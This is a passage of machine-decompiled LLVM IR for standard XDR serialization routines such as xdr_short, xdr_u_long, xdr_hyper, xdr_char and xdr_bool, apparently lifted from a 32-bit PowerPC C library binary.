  %v3_10011334 = load i32, i32* %v2_10011334, align 4
  %v1_10011338 = add i32 %v3_10011334, 4
  br label %dec_label_pc_10011354

dec_label_pc_10011340:                            ; preds = %entry
  %v3_1001132c = icmp eq i32 %v2_10011324, 1
  br i1 %v3_1001132c, label %dec_label_pc_1001134c, label %dec_label_pc_10011368

dec_label_pc_1001134c:                            ; preds = %dec_label_pc_10011340
  %v1_1001134c = add i32 %v0_10011324, 4
  %v2_1001134c = inttoptr i32 %v1_1001134c to i32*
  %v3_1001134c = load i32, i32* %v2_1001134c, align 4
  br label %dec_label_pc_10011354

dec_label_pc_10011354:                            ; preds = %dec_label_pc_10011334, %dec_label_pc_1001134c
  %storemerge.in.in = phi i32 [ %v1_10011338, %dec_label_pc_10011334 ], [ %v3_1001134c, %dec_label_pc_1001134c ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  call void @__pseudo_call(i32 %storemerge)
  %v0_1001135c = load i32, i32* @r3, align 4
  br label %dec_label_pc_10011368

dec_label_pc_10011368:                            ; preds = %dec_label_pc_10011340, %dec_label_pc_10011354
  %storemerge1 = phi i32 [ %v0_1001135c, %dec_label_pc_10011354 ], [ 0, %dec_label_pc_10011340 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_10011324, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011368, { 1, 0 }
  uselistorder label %dec_label_pc_10011354, { 1, 0 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i16, align 2
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_10011394 = load i32, i32* %r3.global-to-local, align 4
  %v1_10011394 = inttoptr i32 %v0_10011394 to i32*
  %v2_10011394 = load i32, i32* %v1_10011394, align 4
  %v3_10011398 = icmp eq i32 %v2_10011394, 1
  br i1 %v3_10011398, label %dec_label_pc_100113d4, label %dec_label_pc_100113a4

dec_label_pc_100113a4:                            ; preds = %entry
  %v1_1001139c = icmp eq i32 %v2_10011394, 0
  br i1 %v1_1001139c, label %dec_label_pc_100113b8, label %dec_label_pc_100113ac

dec_label_pc_100113ac:                            ; preds = %dec_label_pc_100113a4
  %v3_100113a4 = icmp eq i32 %v2_10011394, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_100113a4, label %dec_label_pc_10011400, label %dec_label_pc_100113fc

dec_label_pc_100113b8:                            ; preds = %dec_label_pc_100113a4
  %v1_100113b8 = inttoptr i32 %arg2 to i16*
  %v2_100113b8 = load i16, i16* %v1_100113b8, align 2
  %v1_100113bc = add i32 %v0_10011394, 4
  %v2_100113bc = inttoptr i32 %v1_100113bc to i32*
  %v3_100113bc = load i32, i32* %v2_100113bc, align 4
  store i16 %v2_100113b8, i16* %stack_var_-24, align 2
  %v1_100113c4 = add i32 %v3_100113bc, 4
  %v2_100113c4 = inttoptr i32 %v1_100113c4 to i32*
  %v3_100113c4 = load i32, i32* %v2_100113c4, align 4
  call void @__pseudo_call(i32 %v3_100113c4)
  br label %dec_label_pc_10011400

dec_label_pc_100113d4:                            ; preds = %entry
  %v1_100113d4 = add i32 %v0_10011394, 4
  %v2_100113d4 = inttoptr i32 %v1_100113d4 to i32*
  %v3_100113d4 = load i32, i32* %v2_100113d4, align 4
  %v1_100113d8 = inttoptr i32 %v3_100113d4 to i32*
  %v2_100113d8 = load i32, i32* %v1_100113d8, align 4
  call void @__pseudo_call(i32 %v2_100113d8)
  %v0_100113e4 = load i32, i32* %r3.global-to-local, align 4
  %v3_100113e4 = icmp eq i32 %v0_100113e4, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_100113e4, label %dec_label_pc_100113fc, label %dec_label_pc_100113f0

dec_label_pc_100113f0:                            ; preds = %dec_label_pc_100113d4
  %v3_100113f0 = load i16, i16* %stack_var_-24, align 2
  %v2_100113f4 = load i32, i32* %r31.global-to-local, align 4
  %v3_100113f4 = inttoptr i32 %v2_100113f4 to i16*
  store i16 %v3_100113f0, i16* %v3_100113f4, align 2
  br label %dec_label_pc_10011400

dec_label_pc_100113fc:                            ; preds = %dec_label_pc_100113ac, %dec_label_pc_100113d4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011400

dec_label_pc_10011400:                            ; preds = %dec_label_pc_100113ac, %dec_label_pc_100113f0, %dec_label_pc_100113b8, %dec_label_pc_100113fc
  %v0_10011410 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011410

; uselistorder directives
  uselistorder i16* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_10011400, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100113fc, { 1, 0 }
}

define i32 @__GI_xdr_int(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10011414 = call i32 @__GI_xdr_long()
  ret i32 %v0_10011414
}

define i32 @xdr_u_long() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10011424 = load i32, i32* @r4, align 4
  store i32 %v0_10011424, i32* %r31.global-to-local, align 4
  %v0_1001142c = load i32, i32* @r3, align 4
  %v1_1001142c = inttoptr i32 %v0_1001142c to i32*
  %v2_1001142c = load i32, i32* %v1_1001142c, align 4
  %v3_10011430 = icmp eq i32 %v2_1001142c, 1
  br i1 %v3_10011430, label %dec_label_pc_10011450, label %dec_label_pc_1001143c

dec_label_pc_1001143c:                            ; preds = %entry
  %v1_10011434 = icmp eq i32 %v2_1001142c, 0
  br i1 %v1_10011434, label %dec_label_pc_1001147c, label %dec_label_pc_10011444

dec_label_pc_10011444:                            ; preds = %dec_label_pc_1001143c
  %v3_1001143c = icmp eq i32 %v2_1001142c, 2
  store i32 1, i32* @r3, align 4
  br i1 %v3_1001143c, label %dec_label_pc_10011494, label %dec_label_pc_10011490

dec_label_pc_10011450:                            ; preds = %entry
  %v1_10011450 = add i32 %v0_1001142c, 4
  %v2_10011450 = inttoptr i32 %v1_10011450 to i32*
  %v3_10011450 = load i32, i32* %v2_10011450, align 4
  %v1_10011458 = inttoptr i32 %v3_10011450 to i32*
  %v2_10011458 = load i32, i32* %v1_10011458, align 4
  call void @__pseudo_call(i32 %v2_10011458)
  %v0_10011464 = load i32, i32* @r3, align 4
  %v3_10011464 = icmp eq i32 %v0_10011464, 0
  store i32 1, i32* @r3, align 4
  br i1 %v3_10011464, label %dec_label_pc_10011490, label %dec_label_pc_10011470

dec_label_pc_10011470:                            ; preds = %dec_label_pc_10011450
  %v3_10011470 = load i32, i32* %stack_var_-24, align 4
  %v1_10011474 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011474 = inttoptr i32 %v1_10011474 to i32*
  store i32 %v3_10011470, i32* %v2_10011474, align 4
  br label %dec_label_pc_10011494

dec_label_pc_1001147c:                            ; preds = %dec_label_pc_1001143c
  %v1_1001147c = add i32 %v0_1001142c, 4
  %v2_1001147c = inttoptr i32 %v1_1001147c to i32*
  %v3_1001147c = load i32, i32* %v2_1001147c, align 4
  %v1_10011480 = add i32 %v3_1001147c, 4
  %v2_10011480 = inttoptr i32 %v1_10011480 to i32*
  %v3_10011480 = load i32, i32* %v2_10011480, align 4
  call void @__pseudo_call(i32 %v3_10011480)
  br label %dec_label_pc_10011494

dec_label_pc_10011490:                            ; preds = %dec_label_pc_10011444, %dec_label_pc_10011450
  store i32 0, i32* @r3, align 4
  br label %dec_label_pc_10011494

dec_label_pc_10011494:                            ; preds = %dec_label_pc_10011444, %dec_label_pc_1001147c, %dec_label_pc_10011470, %dec_label_pc_10011490
  %v0_100114a4 = load i32, i32* @r3, align 4
  ret i32 %v0_100114a4

; uselistorder directives
  uselistorder i32 %v0_1001142c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011494, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10011490, { 1, 0 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v0_100114a8 = call i32 @xdr_u_long()
  ret i32 %v0_100114a8
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100114ac = load i32, i32* @lr, align 4
  store i32 %v0_100114ac, i32* %r0.global-to-local, align 4
  %v0_100114b8 = load i32, i32* @r4, align 4
  store i32 %v0_100114b8, i32* %r30.global-to-local, align 4
  %v0_100114c0 = load i32, i32* @r3, align 4
  store i32 %v0_100114c0, i32* %r31.global-to-local, align 4
  %v1_100114c8 = inttoptr i32 %v0_100114c0 to i32*
  %v2_100114c8 = load i32, i32* %v1_100114c8, align 4
  store i32 %v2_100114c8, i32* %r0.global-to-local, align 4
  %v3_100114cc = icmp eq i32 %v2_100114c8, 0
  br i1 %v3_100114cc, label %dec_label_pc_100114d8, label %dec_label_pc_10011538

dec_label_pc_100114d8:                            ; preds = %entry
  %v1_100114d8 = inttoptr i32 %v0_100114b8 to i32*
  %v2_100114d8 = load i32, i32* %v1_100114d8, align 4
  %v1_100114dc = add i32 %v0_100114b8, 4
  %v2_100114dc = inttoptr i32 %v1_100114dc to i32*
  %v3_100114e0 = load i32, i32* %v2_100114dc, align 4
  store i32 %v3_100114e0, i32* %r0.global-to-local, align 4
  %v1_100114ec = add i32 %v0_100114c0, 4
  %v2_100114ec = inttoptr i32 %v1_100114ec to i32*
  %v3_100114ec = load i32, i32* %v2_100114ec, align 4
  store i32 %v2_100114d8, i32* %stack_var_-24, align 4
  store i32 %v3_100114e0, i32* %stack_var_-20, align 4
  %v1_100114f8 = add i32 %v3_100114ec, 4
  %v2_100114f8 = inttoptr i32 %v1_100114f8 to i32*
  %v3_100114f8 = load i32, i32* %v2_100114f8, align 4
  call void @__pseudo_call(i32 %v3_100114f8)
  %v0_10011508 = load i32, i32* @r3, align 4
  %v3_10011508 = icmp eq i32 %v0_10011508, 0
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_10011510 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10011510, i32* %r3.global-to-local, align 4
  br i1 %v3_10011508, label %dec_label_pc_100115a0, label %dec_label_pc_10011518

dec_label_pc_10011518:                            ; preds = %dec_label_pc_100114d8
  %v1_10011518 = add i32 %v0_10011510, 4
  %v2_10011518 = inttoptr i32 %v1_10011518 to i32*
  %v3_10011518 = load i32, i32* %v2_10011518, align 4
  %v1_1001151c = add i32 %v3_10011518, 4
  %v2_1001151c = inttoptr i32 %v1_1001151c to i32*
  %v3_1001151c = load i32, i32* %v2_1001151c, align 4
  call void @__pseudo_call(i32 %v3_1001151c)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100115a0

dec_label_pc_10011538:                            ; preds = %entry
  %v3_100114d0 = icmp eq i32 %v2_100114c8, 1
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v3_100114d0, label %dec_label_pc_1001154c, label %dec_label_pc_100115a0

dec_label_pc_1001154c:                            ; preds = %dec_label_pc_10011538
  %v1_1001154c = add i32 %v0_100114c0, 4
  %v2_1001154c = inttoptr i32 %v1_1001154c to i32*
  %v3_1001154c = load i32, i32* %v2_1001154c, align 4
  %v1_10011550 = inttoptr i32 %v3_1001154c to i32*
  %v2_10011550 = load i32, i32* %v1_10011550, align 4
  call void @__pseudo_call(i32 %v2_10011550)
  %v0_10011560 = load i32, i32* @r3, align 4
  %v3_10011560 = icmp eq i32 %v0_10011560, 0
  %v0_10011564 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10011564, i32* %r3.global-to-local, align 4
  br i1 %v3_10011560, label %dec_label_pc_1001159c, label %dec_label_pc_1001156c

dec_label_pc_1001156c:                            ; preds = %dec_label_pc_1001154c
  %v1_1001156c = add i32 %v0_10011564, 4
  %v2_1001156c = inttoptr i32 %v1_1001156c to i32*
  %v3_1001156c = load i32, i32* %v2_1001156c, align 4
  %v1_10011570 = inttoptr i32 %v3_1001156c to i32*
  %v2_10011570 = load i32, i32* %v1_10011570, align 4
  call void @__pseudo_call(i32 %v2_10011570)
  store i32 1, i32* %r8.global-to-local, align 4
  %v0_10011580 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011580 = icmp eq i32 %v0_10011580, 0
  br i1 %v3_10011580, label %dec_label_pc_1001159c, label %dec_label_pc_10011588

dec_label_pc_10011588:                            ; preds = %dec_label_pc_1001156c
  %v3_10011588 = load i32, i32* %stack_var_-20, align 4
  %v3_1001158c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_1001158c, i32* %r0.global-to-local, align 4
  %v1_10011590 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011590 = add i32 %v1_10011590, 4
  %v3_10011590 = inttoptr i32 %v2_10011590 to i32*
  store i32 %v3_10011588, i32* %v3_10011590, align 4
  %v0_10011594 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011594 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011594 = inttoptr i32 %v1_10011594 to i32*
  store i32 %v0_10011594, i32* %v2_10011594, align 4
  %v0_100115a4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100115a0

dec_label_pc_1001159c:                            ; preds = %dec_label_pc_1001156c, %dec_label_pc_1001154c
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100115a0

dec_label_pc_100115a0:                            ; preds = %dec_label_pc_10011538, %dec_label_pc_100114d8, %dec_label_pc_10011588, %dec_label_pc_10011518, %dec_label_pc_1001159c
  %v0_100115a4 = phi i32 [ 0, %dec_label_pc_10011538 ], [ 0, %dec_label_pc_100114d8 ], [ %v0_100115a4.pre, %dec_label_pc_10011588 ], [ 1, %dec_label_pc_10011518 ], [ 0, %dec_label_pc_1001159c ]
  store i32 %v0_100114ac, i32* %r0.global-to-local, align 4
  store i32 %v0_100115a4, i32* %r3.global-to-local, align 4
  ret i32 %v0_100115a4

; uselistorder directives
  uselistorder i32 %v0_100115a4, { 1, 0 }
  uselistorder i32 %v0_100114c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100114b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100115a0, { 4, 2, 0, 3, 1 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100115b8 = load i32, i32* @lr, align 4
  store i32 %v0_100115b8, i32* %r0.global-to-local, align 4
  %v0_100115c4 = load i32, i32* @r4, align 4
  store i32 %v0_100115c4, i32* %r30.global-to-local, align 4
  %v0_100115cc = load i32, i32* @r3, align 4
  store i32 %v0_100115cc, i32* %r31.global-to-local, align 4
  %v1_100115d4 = inttoptr i32 %v0_100115cc to i32*
  %v2_100115d4 = load i32, i32* %v1_100115d4, align 4
  store i32 %v2_100115d4, i32* %r0.global-to-local, align 4
  %v3_100115d8 = icmp eq i32 %v2_100115d4, 0
  br i1 %v3_100115d8, label %dec_label_pc_100115e4, label %dec_label_pc_10011638

dec_label_pc_100115e4:                            ; preds = %entry
  %v1_100115e4 = add i32 %v0_100115c4, 4
  %v2_100115e4 = inttoptr i32 %v1_100115e4 to i32*
  %v3_100115e4 = load i32, i32* %v2_100115e4, align 4
  store i32 %v3_100115e4, i32* %r0.global-to-local, align 4
  %v1_100115e8 = inttoptr i32 %v0_100115c4 to i32*
  %v2_100115e8 = load i32, i32* %v1_100115e8, align 4
  store i32 %v2_100115e8, i32* %r10.global-to-local, align 4
  %v1_100115ec = add i32 %v0_100115cc, 4
  %v2_100115ec = inttoptr i32 %v1_100115ec to i32*
  %v3_100115ec = load i32, i32* %v2_100115ec, align 4
  store i32 %v3_100115e4, i32* %stack_var_-20, align 4
  store i32 %v2_100115e8, i32* %stack_var_-24, align 4
  %v1_100115f8 = add i32 %v3_100115ec, 4
  %v2_100115f8 = inttoptr i32 %v1_100115f8 to i32*
  %v3_100115f8 = load i32, i32* %v2_100115f8, align 4
  call void @__pseudo_call(i32 %v3_100115f8)
  %v0_10011608 = load i32, i32* @r3, align 4
  %v3_10011608 = icmp eq i32 %v0_10011608, 0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10011610 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10011610, i32* %r3.global-to-local, align 4
  br i1 %v3_10011608, label %dec_label_pc_100116a0, label %dec_label_pc_10011618

dec_label_pc_10011618:                            ; preds = %dec_label_pc_100115e4
  %v1_10011618 = add i32 %v0_10011610, 4
  %v2_10011618 = inttoptr i32 %v1_10011618 to i32*
  %v3_10011618 = load i32, i32* %v2_10011618, align 4
  %v1_1001161c = add i32 %v3_10011618, 4
  %v2_1001161c = inttoptr i32 %v1_1001161c to i32*
  %v3_1001161c = load i32, i32* %v2_1001161c, align 4
  call void @__pseudo_call(i32 %v3_1001161c)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100116a0

dec_label_pc_10011638:                            ; preds = %entry
  %v3_100115dc = icmp eq i32 %v2_100115d4, 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_100115dc, label %dec_label_pc_1001164c, label %dec_label_pc_100116a0

dec_label_pc_1001164c:                            ; preds = %dec_label_pc_10011638
  %v1_1001164c = add i32 %v0_100115cc, 4
  %v2_1001164c = inttoptr i32 %v1_1001164c to i32*
  %v3_1001164c = load i32, i32* %v2_1001164c, align 4
  %v1_10011650 = inttoptr i32 %v3_1001164c to i32*
  %v2_10011650 = load i32, i32* %v1_10011650, align 4
  call void @__pseudo_call(i32 %v2_10011650)
  %v0_10011660 = load i32, i32* @r3, align 4
  %v3_10011660 = icmp eq i32 %v0_10011660, 0
  %v0_10011664 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10011664, i32* %r3.global-to-local, align 4
  br i1 %v3_10011660, label %dec_label_pc_1001169c, label %dec_label_pc_1001166c

dec_label_pc_1001166c:                            ; preds = %dec_label_pc_1001164c
  %v1_1001166c = add i32 %v0_10011664, 4
  %v2_1001166c = inttoptr i32 %v1_1001166c to i32*
  %v3_1001166c = load i32, i32* %v2_1001166c, align 4
  %v1_10011670 = inttoptr i32 %v3_1001166c to i32*
  %v2_10011670 = load i32, i32* %v1_10011670, align 4
  call void @__pseudo_call(i32 %v2_10011670)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10011680 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011680 = icmp eq i32 %v0_10011680, 0
  br i1 %v3_10011680, label %dec_label_pc_1001169c, label %dec_label_pc_10011688

dec_label_pc_10011688:                            ; preds = %dec_label_pc_1001166c
  %v3_10011688 = load i32, i32* %stack_var_-24, align 4
  %v3_1001168c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_1001168c, i32* %r10.global-to-local, align 4
  %v1_10011690 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011690 = inttoptr i32 %v1_10011690 to i32*
  store i32 %v3_10011688, i32* %v2_10011690, align 4
  %v0_10011694 = load i32, i32* %r10.global-to-local, align 4
  %v1_10011694 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011694 = add i32 %v1_10011694, 4
  %v3_10011694 = inttoptr i32 %v2_10011694 to i32*
  store i32 %v0_10011694, i32* %v3_10011694, align 4
  %v0_100116a0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100116a0

dec_label_pc_1001169c:                            ; preds = %dec_label_pc_1001166c, %dec_label_pc_1001164c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100116a0

dec_label_pc_100116a0:                            ; preds = %dec_label_pc_10011638, %dec_label_pc_100115e4, %dec_label_pc_10011688, %dec_label_pc_10011618, %dec_label_pc_1001169c
  %v0_100116a0 = phi i32 [ 0, %dec_label_pc_10011638 ], [ 0, %dec_label_pc_100115e4 ], [ %v0_100116a0.pre, %dec_label_pc_10011688 ], [ 1, %dec_label_pc_10011618 ], [ 0, %dec_label_pc_1001169c ]
  store i32 %v0_100116a0, i32* %r3.global-to-local, align 4
  store i32 %v0_100115b8, i32* %r0.global-to-local, align 4
  ret i32 %v0_100116a0

; uselistorder directives
  uselistorder i32 %v0_100116a0, { 1, 0 }
  uselistorder i32 %v0_100115cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100115c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100116a0, { 4, 2, 0, 3, 1 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_100116b8 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_100116b8
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_100116bc = call i32 @xdr_u_hyper()
  ret i32 %v0_100116bc
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i16, align 2
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_100116d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100116d8 = inttoptr i32 %v0_100116d8 to i32*
  %v2_100116d8 = load i32, i32* %v1_100116d8, align 4
  %v3_100116dc = icmp eq i32 %v2_100116d8, 1
  br i1 %v3_100116dc, label %dec_label_pc_10011718, label %dec_label_pc_100116e8

dec_label_pc_100116e8:                            ; preds = %entry
  %v1_100116e0 = icmp eq i32 %v2_100116d8, 0
  br i1 %v1_100116e0, label %dec_label_pc_100116fc, label %dec_label_pc_100116f0

dec_label_pc_100116f0:                            ; preds = %dec_label_pc_100116e8
  %v3_100116e8 = icmp eq i32 %v2_100116d8, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_100116e8, label %dec_label_pc_10011744, label %dec_label_pc_10011740

dec_label_pc_100116fc:                            ; preds = %dec_label_pc_100116e8
  %v1_100116fc = inttoptr i32 %arg2 to i16*
  %v2_100116fc = load i16, i16* %v1_100116fc, align 2
  %v1_10011700 = add i32 %v0_100116d8, 4
  %v2_10011700 = inttoptr i32 %v1_10011700 to i32*
  %v3_10011700 = load i32, i32* %v2_10011700, align 4
  store i16 %v2_100116fc, i16* %stack_var_-24, align 2
  %v1_10011708 = add i32 %v3_10011700, 4
  %v2_10011708 = inttoptr i32 %v1_10011708 to i32*
  %v3_10011708 = load i32, i32* %v2_10011708, align 4
  call void @__pseudo_call(i32 %v3_10011708)
  br label %dec_label_pc_10011744

dec_label_pc_10011718:                            ; preds = %entry
  %v1_10011718 = add i32 %v0_100116d8, 4
  %v2_10011718 = inttoptr i32 %v1_10011718 to i32*
  %v3_10011718 = load i32, i32* %v2_10011718, align 4
  %v1_1001171c = inttoptr i32 %v3_10011718 to i32*
  %v2_1001171c = load i32, i32* %v1_1001171c, align 4
  call void @__pseudo_call(i32 %v2_1001171c)
  %v0_10011728 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011728 = icmp eq i32 %v0_10011728, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10011728, label %dec_label_pc_10011740, label %dec_label_pc_10011734

dec_label_pc_10011734:                            ; preds = %dec_label_pc_10011718
  %v3_10011734 = load i16, i16* %stack_var_-24, align 2
  %v2_10011738 = load i32, i32* %r31.global-to-local, align 4
  %v3_10011738 = inttoptr i32 %v2_10011738 to i16*
  store i16 %v3_10011734, i16* %v3_10011738, align 2
  br label %dec_label_pc_10011744

dec_label_pc_10011740:                            ; preds = %dec_label_pc_100116f0, %dec_label_pc_10011718
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011744

dec_label_pc_10011744:                            ; preds = %dec_label_pc_100116f0, %dec_label_pc_10011734, %dec_label_pc_100116fc, %dec_label_pc_10011740
  %v0_10011754 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011754

; uselistorder directives
  uselistorder i16* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_10011744, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10011740, { 1, 0 }
}

define i32 @xdr_char(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i8, align 1
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1001176c = load i8, i8* %arg1, align 1
  %v2_10011770 = ptrtoint i8* %stack_var_-24 to i32
  store i8 %v3_1001176c, i8* %stack_var_-24, align 1
  store i32 268507004, i32* @lr, align 4
  %v1_10011778 = call i32 @__GI_xdr_int(i32 %v2_10011770)
  %v3_1001177c = icmp eq i32 %v1_10011778, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1001177c, label %dec_label_pc_10011794, label %dec_label_pc_10011788

dec_label_pc_10011788:                            ; preds = %entry
  %v3_10011788 = load i8, i8* %stack_var_-24, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10011790 = load i32, i32* %r31.global-to-local, align 4
  %v3_10011790 = inttoptr i32 %v2_10011790 to i8*
  store i8 %v3_10011788, i8* %v3_10011790, align 1
  %v0_100117a4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011794

dec_label_pc_10011794:                            ; preds = %entry, %dec_label_pc_10011788
  %v0_100117a4 = phi i32 [ 0, %entry ], [ %v0_100117a4.pre, %dec_label_pc_10011788 ]
  ret i32 %v0_100117a4

; uselistorder directives
  uselistorder i8* %stack_var_-24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011794, { 1, 0 }
}

define i32 @xdr_u_char(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i8, align 1
  store i32 %tmp, i32* @r31, align 4
  %v3_100117bc = load i8, i8* %arg1, align 1
  %v2_100117c0 = ptrtoint i8* %stack_var_-24 to i32
  store i32 %v2_100117c0, i32* @r4, align 4
  store i8 %v3_100117bc, i8* %stack_var_-24, align 1
  store i32 268507084, i32* @lr, align 4
  %v2_100117c8 = bitcast i8* %stack_var_-24 to i32*
  %v4_100117c8 = call i32 @xdr_u_int(i32* %v2_100117c8, i32* %v2_100117c8)
  %v3_100117cc = icmp eq i32 %v4_100117c8, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_100117cc, label %dec_label_pc_100117e4, label %dec_label_pc_100117d8

dec_label_pc_100117d8:                            ; preds = %entry
  %v3_100117d8 = load i8, i8* %stack_var_-24, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_100117e0 = load i32, i32* @r31, align 4
  %v3_100117e0 = inttoptr i32 %v2_100117e0 to i8*
  store i8 %v3_100117d8, i8* %v3_100117e0, align 1
  %v0_100117f4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100117e4

dec_label_pc_100117e4:                            ; preds = %entry, %dec_label_pc_100117d8
  %v0_100117f4 = phi i32 [ 0, %entry ], [ %v0_100117f4.pre, %dec_label_pc_100117d8 ]
  ret i32 %v0_100117f4

; uselistorder directives
  uselistorder i8* %stack_var_-24, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_100117e4, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_10011810 = load i32, i32* %r3.global-to-local, align 4
  %v1_10011810 = inttoptr i32 %v0_10011810 to i32*
  %v2_10011810 = load i32, i32* %v1_10011810, align 4
  %v3_10011814 = icmp eq i32 %v2_10011810, 1
  br i1 %v3_10011814, label %dec_label_pc_10011858, label %dec_label_pc_10011820

dec_label_pc_10011820:                            ; preds = %entry
  %v1_10011818 = icmp eq i32 %v2_10011810, 0
  br i1 %v1_10011818, label %dec_label_pc_10011834, label %dec_label_pc_10011828

dec_label_pc_10011828:                            ; preds = %dec_label_pc_10011820
  %v3_10011820 = icmp eq i32 %v2_10011810, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10011820, label %dec_label_pc_1001188c, label %dec_label_pc_10011888

dec_label_pc_10011834:                            ; preds = %dec_label_pc_10011820
  %v1_10011834 = inttoptr i32 %arg2 to i32*
  %v2_10011834 = load i32, i32* %v1_10011834, align 4
  %v1_10011838 = add i32 %v0_10011810, 4
  %v2_10011838 = inttoptr i32 %v1_10011838 to i32*
  %v3_10011838 = load i32, i32* %v2_10011838, align 4
  %v2_1001183c = icmp ne i32 %v2_10011834, 0
